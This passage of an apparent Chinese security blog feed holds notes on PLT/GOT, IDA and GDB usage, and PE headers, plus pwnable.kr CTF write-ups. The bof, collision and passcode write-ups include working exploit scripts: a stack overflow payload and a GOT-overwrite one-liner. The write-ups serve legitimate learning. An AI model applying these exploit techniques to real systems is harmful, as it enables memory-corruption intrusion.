title="plt与got"></a>plt与got</h2><p>1.他们存在实质就是为了对程序所要使用的公共函数（在动态链接库里）进行一个重定位，这就好比PE中的输入表的中的地址修正。</p><p>2.对于elf文件，它在执行一个动态库函数如printf函数时，先call printf@plt（printf@plt其实是一小段代码的首地址），然后在printf@plt这段代码中再到.got.plt中找函数实际的地址最后跳转。</p><p>3.那其实 .plt其实就是存放着所要使用函数的信息及跳转，而所有要使用的函数信息就组成了 .plt表。</p><p>4.对于.got表就是存在每个所需要的函数的实际地址，.got.plt其实是.got表的一部分。</p><p><strong>5.所以在pwn题中，找动态库函数的实际地址时要用 elf.got[‘函数名称’]；执行函数的地址用 elf.plt[‘函数地址’]。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;栈的学习理解&quot;&gt;&lt;a href=&quot;#栈的学习理解&quot; class=&quot;headerlink&quot; title=&quot;栈的学习理解&quot;&gt;&lt;/a&gt;栈的学习理解&lt;/h2&gt;&lt;p&gt;1.对于栈，主要是程序运行中保存函数的运行状态信息，参数及局部变量。发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；函数调用结束后通过一些列指令还原调用函数的状态信息，并执行调用函数下一条指令。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;入栈顺序：1.参数 2.调用函数的下一条指令地址（通过 call）3.调用函数栈的基地址（ebp）4.被调用函数需要使用的局部变量。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://www.Bxnop.cn/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn pwnable（1）</title>
    <link href="https://www.bxnop.cn/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/"/>
    <id>https://www.bxnop.cn/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/</id>
    <published>2020-06-03T05:09:46.000Z</published>
    <updated>2020-06-08T14:23:56.714Z</updated>
    
    <content type="html"><![CDATA[<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><ul><li><p>题目描述。</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200603151159958.png" alt="image-20200603151159958"></p><a id="more"></a></li><li><p>通过ssh连接后，有3个文件，flag没有权限查看，那就看 fd.c</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200603151520348.png" alt="image-20200603151520348"></p></li><li><p>由于read函数的第一个参数，0：标准输入；1：标准输出；2：标准错误输出。那这里只要样fd等于0就好了。</p></li><li><p>直接让输入第一个参数为 4,660(0x1234)，接着再输入 LETMEWIN 得到flag。</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200603152007549.png" alt="image-20200603152007549"></p></li></ul><h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><blockquote><p>学习了栈溢出后做这个题正合适</p></blockquote><ul><li><p>得到题目的elf文件后ida打开。</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200603152328450.png" alt="image-20200603152328450"></p></li><li><p>再利用ida中很好的栈显示，计算得到需要填充大小 0x34 。</p></li><li><p>写py脚本，攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="number">0x34</span>*<span class="string">'a'</span> + p32(<span class="number">0xCAFEBABE</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(message)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200603152657713.png" alt="image-20200603152657713"></p></li><li><p><strong>总结：从基础的溢出开始，慢慢进步。</strong></p></li></ul><h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><ul><li><p>题目描述。</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200605090406828.png" alt="image-20200605090406828"></p></li><li><p>ssh连接后发现就是让我们输入20个字节的数据，然后转化为5个4字节数据的值相加为0x21DD09EC。</p></li><li><p>那就直接凑了，开始直接想的是输入16个0加一个原数据，但字符串计算长度时就会过不了。那凑得方法也很多，只是怎样将不可打印字符输入终端，知道可以使用python的单行执行脚本呢 -c。</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200605090938145.png" alt="image-20200605090938145"></p></li><li><p>另外其实一直想用脚本直接实现，但是不知道怎么用，网上果然有，学习了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = p32(<span class="number">0x6c5cec9</span>)*<span class="number">4</span> + p32(<span class="number">0x6c5cec8</span>)</span><br><span class="line"></span><br><span class="line">p = ssh(host=<span class="string">'pwnable.kr'</span>, port=<span class="number">2222</span>, user=<span class="string">'col'</span>, password=<span class="string">'guest'</span>)</span><br><span class="line">p.connected()</span><br><span class="line"></span><br><span class="line">p1 = p.process(argv=[<span class="string">'col'</span>, s], executable=<span class="string">'./col'</span>)</span><br><span class="line"><span class="keyword">print</span> p1.recv()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200605092003637.png" alt="image-20200605092003637"></p></li><li><p><strong>总结：1.利用python单行脚本输入不打印字符数据。2.利用脚本对ssh连接并交互的方法。3.哈希碰撞的概念。</strong></p></li></ul><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><ul><li>查看保护的时候发现了upx壳，脱壳后载入ida即可发现flag。</li><li>总结：无。</li></ul><h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><blockquote><p>利用scanf()函数中没加取址符&amp;存在的漏洞，覆写got表来达到控制程序走向的目的。</p></blockquote><ul><li><p>题目描述。</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200608181103998.png" alt="image-20200608181103998"></p></li><li><p>连接后查看passcode.c文件，可以看到scanf()是没有加取地址符的，想通过输入达到目的肯定会报错。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>再看到welcome（）函数，scanf(“%100s”, name)对输入字符串长度进行了限制，想通过溢出是不行了。</p></li><li><p>既然程序出了问题是没加取址符，那突破口肯定就在哪里。又是我第一次遇到的漏洞类型，由于scanf(“%d”, passcode1)中passcode1没加取地址符，将会把passcode1本身的值作为地址然后向其写入数据。并且这个passcode1没有初始化，所以它的默认的值将是上次栈中留下来的值，我们就可以控制上次向栈中写的数据，使scanf（）中的地址是我们向输入数据的地址。</p></li></ul><blockquote><p>知识点：在welcome（）函数结束后，虽然它会<strong>push esp, ebp；pop ebp；ret</strong>进行一个堆栈平衡，但是只是改变了esp寄存器的值，栈中的内容没有进行清理，如果下次使用同一个栈定义了变量但没有赋初值，那它的初始值将是上次栈中的。</p></blockquote><ul><li><p>由于got表是可以重写的，它记录着我们要执行函数的地址，那我们就可以将下次要执行的函数地址改成我们想要它执行的函数地址。通过<strong>objdump -R passcode</strong>查看got表。可以看到我们要改写函数在got表中地址为  <strong>0x0804a004</strong></p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200608182629397.png" alt="image-20200608182629397"></p></li><li><p>找我们想要执行的函数的地址。使用<strong>objdump -d passcode</strong>查看反汇编。找到我们想要执行函数地址：<strong>0x080485e3</strong></p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200608183049831.png" alt="image-20200608183049831"></p></li><li><p>地址找到后，寻找第一次welcome()函数中输入的字符串的哪一部分会是后面login()函数的第一个变量的值。其实很简单，2个函数是同一个ebp，第一个函数输入的最后4个字节数据将是第二个函数第一个变量的4个字节数据。（解释起来有点抽象，理解了就很简单）</p></li><li><p>最后构造字符串，攻击。由于登录到远程终端里没有执行和写脚本的权限，直接使用python与管道命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print 'a'*96 + '\x04\xa0\x04\x08' + '134514147'"</span> | ./passcode</span><br></pre></td></tr></table></figure><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200608184738940.png" alt="image-20200608184738940"></p></li><li><p><strong>总结：1.2个命令的学习 objdump -R 文件名（查看got表） 与 objdump -d 文件名（查看反汇编）。2.覆写got的攻击。</strong></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;fd&quot;&gt;&lt;a href=&quot;#fd&quot; class=&quot;headerlink&quot; title=&quot;fd&quot;&gt;&lt;/a&gt;fd&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;题目描述。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200603151159958.png&quot; alt=&quot;image-20200603151159958&quot;&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://www.Bxnop.cn/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>工具使用总结</title>
    <link href="https://www.bxnop.cn/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>https://www.bxnop.cn/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</id>
    <published>2020-06-02T02:36:00.000Z</published>
    <updated>2020-09-17T09:18:00.115Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下平时使用工具的知识点。<a id="more"></a></p><h2 id="IDA实用快捷键"><a href="#IDA实用快捷键" class="headerlink" title="IDA实用快捷键"></a>IDA实用快捷键</h2><ul><li>空格：Graph overview 与 Text view 之间相关切换</li><li>tap：伪代码与汇编代码快速切换</li><li>alt+t：搜索字符串</li><li>shift+e：将数据以指令方式提取出来</li><li>ctrl+s：查看程序各个段的情况</li><li>u：取消定义；a：数据转化为字符串</li><li>p：数据转化为函数</li><li>y：改变数据类型</li></ul><h2 id="GDB脚本的使用"><a href="#GDB脚本的使用" class="headerlink" title="GDB脚本的使用"></a>GDB脚本的使用</h2><ol><li><p>执行gdb脚本有2中反方式，一：直接输入defien命令，输入指令，最后执行。二：单独写成一个脚本文件使用 source 来执行。</p></li><li><p>gdb脚本中的 查看内存内容的方法：x/&lt;n/f/u&gt; <addr>     n、f、u是可选的参数。</addr></p><p>n：显示的内存单元的个数，f：表示显示的格式，其中：s：字符串显示，x：按十六进制格式显示，d：按十进制格式显示变量</p><p>u：按十六进制格式显示无符号整型，t：按二进制格式显示， o：按八进制格式显示，c：按字符格式显示变量。</p><p>最后的u表示每个单元的大小，其中：b表示单字节，h表示双字节，w表示四字 节，g表示八字节。</p><p>如： x/127xb  表示将 127个的单字节单元的数据按16进制格式显示出来。</p></li><li><p>脚本中的空格要求十分严格。</p></li></ol><h2 id="GDB常用命令"><a href="#GDB常用命令" class="headerlink" title="GDB常用命令"></a>GDB常用命令</h2><ul><li><p>layout+制定显示内容：用于对我们要显示的内容进行分一个窗口显示，达到一边执行一边显示，如 layout asm</p></li><li><p>r：开始运行；c：继续运行；si：单步步入；n：单步步过；</p></li><li><p>disassemble main：查看main函数；x/2wx$esp：以16进制查看$esp地址处2个单位的内容，每个单位4个字节（上面有总结）</p></li><li><p>i r：查看寄存器的值；</p></li><li><p>starti：可以先将程序打开，但是不运行。</p></li><li><p>info file：查看文件的信息，比如程序入口点</p></li><li><p>layout src：显示源代码，layout asm：显示汇编窗口</p></li><li><p>layout regs：显示源代码/汇编/寄存器窗口</p></li><li><p>ctrl+x+1：但窗口模式，ctrl+x+2：双窗口模式，ctrl+x+a：回到传统模式</p></li></ul><h2 id="对开启了PIE且去掉符号表的程序下断"><a href="#对开启了PIE且去掉符号表的程序下断" class="headerlink" title="对开启了PIE且去掉符号表的程序下断"></a>对开启了PIE且去掉符号表的程序下断</h2><p>在linux的 /proc目录中，每个进程都会在此目录下新建一个进程id为名的文件夹，在该文件夹下的map_files，存储着进程加载的基地址与动态链接的地址信息。</p><p>所以利用以上找到程序的基地址后，再通过修改ida载入的基地址，gdb就与ida中看到的地址对应了，方便调试。</p><h2 id="IDA中运行脚本-idc-python"><a href="#IDA中运行脚本-idc-python" class="headerlink" title="IDA中运行脚本(idc python)"></a>IDA中运行脚本(idc python)</h2><h3 id="idc是ida中内置的脚本语言，一种解释性语言"><a href="#idc是ida中内置的脚本语言，一种解释性语言" class="headerlink" title="idc是ida中内置的脚本语言，一种解释性语言"></a>idc是ida中内置的脚本语言，一种解释性语言</h3><blockquote><p>运行脚本 alt+F7；单行执行python ctrl+F3；查看最近脚本文件：alt+F9</p></blockquote><ol><li><p>执行方法：使用shift+F2快捷键，输入语句后 run；或者直接（alt+F7）添加 script，然后执行。</p></li><li><p>idc中的语法大多与C语言类似。这里总结一些特殊的。</p><ul><li><p>message与C语言printf 用法相同。</p></li><li><p>idc中的变量都定义为：auto 变量名；字符串可以直接用 + 号连接（auto s = “ida” + “idc”;）；支持切片操作。</p></li><li><p>条件表达式中switch不支持。</p></li><li><p>idc中函数不需要指明类型，但必须都定义为静态（static main(){ }）。</p></li><li><p>idc中的数组。</p><p><img src="/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200602144349211.png" alt="image-20200602144349211"></p></li><li><p>idc常用的函数</p><p><img src="/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200602144323138.png" alt="image-20200602144323138"></p></li><li><p>字符串操作函数</p><p><img src="/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200602144745372.png" alt="image-20200602144745372"></p></li><li><p>数据交叉引用函数</p><p><img src="/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200602144841498.png" alt="image-20200602144841498"></p></li></ul></li></ol><h3 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h3><ul><li>执行方法与idc脚本类似，语言不同而已。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下平时使用工具的知识点。&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="https://www.Bxnop.cn/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>PE学习</title>
    <link href="https://www.bxnop.cn/2020/05/30/PE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.bxnop.cn/2020/05/30/PE%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-05-30T08:14:50.000Z</published>
    <updated>2020-09-17T12:02:54.710Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-基础概念"><a href="#0x1-基础概念" class="headerlink" title="0x1 基础概念:"></a>0x1 基础概念:</h2><table><thead><tr><th>EXE文件和DLL文件基本上只是语义上的区别, 唯一区别是有一个标识字段指出EXE或DLL, 常见的PE文件格式有:DLL，EXE，OCX，SYS, SCR, CPL, OBJ等</th></tr></thead><tbody><tr><td><strong>64位的PE文件格式, 做了简单的修饰, 叫PE32+/PE+, 32位字段扩展位64字段</strong></td></tr><tr><td><strong>PE格式的定义地方在 <code>winnt.h</code> 头文件中我们能在其中找到PE文件的定义</strong>  <strong><em>如下图VC的路径查找</em></strong>  <a id="more"></a></td></tr><tr><td><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200507103628502-1590826740464.png" alt="image-20200507103628502"></td></tr><tr><td><strong>VA是进程虚拟内存的绝对地址, RVA是相对虚拟地址      RVA+ImageBase = VA</strong></td></tr><tr><td><strong>32位的Windows OS中, 各进程都分配有4GB的虚拟内存, 所以VA范围: 00000000 ~ FFFFFFFF</strong></td></tr></tbody></table><p>PE文件总体框架.</p><p><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200520084527063-1590826622690.png" alt="image-20200520084527063"></p><p>PE文件执行顺序.</p><table><thead><tr><th>1.执行一个PE文件时, PE装载器首先会找DOS头签名(MZ),检查是否有效,  然后是DOS头里的找 e_lfanew(最后一个成员, 指示PE头的), 如果找到, 则直接跳转.</th></tr></thead><tbody><tr><td><strong>2.找到PE头, 开始检查PE头信息属性是否有效, 如果有效, 就跳转到PE头尾部.</strong></td></tr><tr><td><strong>3.紧跟PE头尾部的是节表, PE装载器开始读取节表中记录了每个属性的信息. 平且采用文件映射将这些节映射到内存.    <u>文件映射: 在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存,而是采用与内存映射的机制,也就是说，Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系,只有真正执行到某个内存页中的指令或者访问某一页中的数据时,这个页面才会被从磁盘提交到物理内存,这种机制使文件装入的速度和文件大小没有太大的关系</u></strong></td></tr><tr><td><strong>4.PE文件映射入内存后, PE装载器继续处理一些逻辑结构, 如输入表的修正.</strong></td></tr></tbody></table><h2 id="0x2-MS-DOS头部及DOS存根"><a href="#0x2-MS-DOS头部及DOS存根" class="headerlink" title="0x2 MS-DOS头部及DOS存根"></a>0x2 MS-DOS头部及DOS存根</h2><table><thead><tr><th>DOS头的作用是兼容MS-DOS操作系统中的可执行文件, 该结构体大小为64字节(0x40)</th></tr></thead><tbody><tr><td><strong>2个重要成员 e_magic(DOS头第一个成员): DOS签名(4D5A -&gt; ASCII值 MZ)    e_lfanew(DOS头最后一个成员): 指示NT头的偏移, 从这里找到PE头(取决于DOS存根大小)</strong></td></tr><tr><td><strong>DOS存根是DOS头与PE文件头中间部分的内容, 为16位的汇编指令组成, 既有代码也有数据, 大小不固定</strong></td></tr><tr><td><strong>我们知道DOS存根的内容是当我们的程序在DOS环境中运行时执行的代码, 也就是给一个提示信息:<code>This is program cannot be run in DOS mode</code>, 那我们是可以随便将其内容修改为自己想填充的东西, 反正不会影响在window os中的运行,  但记住这个大小是不能修改的, 会影响后面指令索引地址跟着出错, 最后程序崩溃(刚开始学习时在一道逆向题中, 就犯了这个错)</strong>      <strong>如下图所示OD程序, 重要字段已标出(DOS存根从0x40 - 0x1FF)</strong></td></tr><tr><td><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200508155307169-1590826775538.png" alt="image-20200508155307169"></td></tr></tbody></table><h2 id="0x3-NT头"><a href="#0x3-NT头" class="headerlink" title="0x3 NT头"></a>0x3 NT头</h2><p><strong>分别介绍3个结构体</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DOWORD Signature;</span><br><span class="line">    <span class="comment">//PE头的标志 50450000</span></span><br><span class="line">    </span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    <span class="comment">//文件头  size: 0xF8  记载文件的大部分属性</span></span><br><span class="line">    </span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">    <span class="comment">//可选头  very important</span></span><br><span class="line">    </span><br><span class="line">&#125;IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">     WORD    Machine;</span><br><span class="line">     <span class="comment">//指出该PE文件运行的平台,每个CPU都有唯一的标识码,一般0x14c(x86)</span></span><br><span class="line">     <span class="number">014</span>C</span><br><span class="line">            </span><br><span class="line">     WORD    NumberOfSections; </span><br><span class="line">     <span class="comment">//指出文件中存在的节区数量 注:这里的定义一定要等于实际</span></span><br><span class="line">     <span class="comment">//大小, 不然程序会运行失败</span></span><br><span class="line">     <span class="number">0008</span>      </span><br><span class="line">         </span><br><span class="line">     DWORD   TimeDateStamp;</span><br><span class="line">     <span class="comment">//PE文件的创建时间，一般有连接器填写 UTC（世界标准时间）进</span></span><br><span class="line">     <span class="comment">//行存储 从1970年1月1日00:00:00算起的秒数值 我们可以用C</span></span><br><span class="line">     <span class="comment">//语言的localtime()函数(时区也会转换)计算.</span></span><br><span class="line">     <span class="number">40B</span>10868  </span><br><span class="line">         </span><br><span class="line">     DWORD   PointerToSymbolTable;</span><br><span class="line">     <span class="comment">//指向符号表COFF的指针, 用于调试信息. 发现每次看都是0</span></span><br><span class="line">     <span class="number">00000000</span></span><br><span class="line">         </span><br><span class="line">     DWORD   NumberOfSymbols;</span><br><span class="line">     <span class="comment">//符号表数量. 发现每次看都是0</span></span><br><span class="line">     <span class="number">00000000</span></span><br><span class="line">         </span><br><span class="line">     WORD    SizeOfOptionalHeader;</span><br><span class="line">     <span class="comment">//指出PE的IMAGE_OPTIONAL_HEADER32结构体或者</span></span><br><span class="line">     <span class="comment">//PE+格式文件的IMAGE_OPTIONAL_HEADER64结构体的长度</span></span><br><span class="line">     <span class="comment">//这两个结构体尺寸是不相同的，所以需要SizeOfOptionalHeader</span></span><br><span class="line">     <span class="comment">//中指明大小32位通常位: E0  64位通常为: F0(不是绝对的)</span></span><br><span class="line">     <span class="comment">//它们只是最小值，可能有更大的值</span></span><br><span class="line">     <span class="number">00E0</span>    </span><br><span class="line">         </span><br><span class="line">     WORD    Characteristics;</span><br><span class="line">     <span class="comment">//标识文件的属性, 文件是否可运行, 是否为DLL文件等.</span></span><br><span class="line">     <span class="comment">//二进制中每一位代表不同属性, 以 bit oR形式结合起来</span></span><br><span class="line">     <span class="comment">//2个需要记住的值. 0002h:.exe文件  2000h: .dll文件 </span></span><br><span class="line">     <span class="number">010</span>E        </span><br><span class="line">          </span><br><span class="line"> &#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br><span class="line"> </span><br><span class="line"> 下图为OD程序的文件头. 在上面每个成员下面依次标出.</span><br></pre></td></tr></table></figure><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200507203805570-1590826622690.png" alt="image-20200507203805570"></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 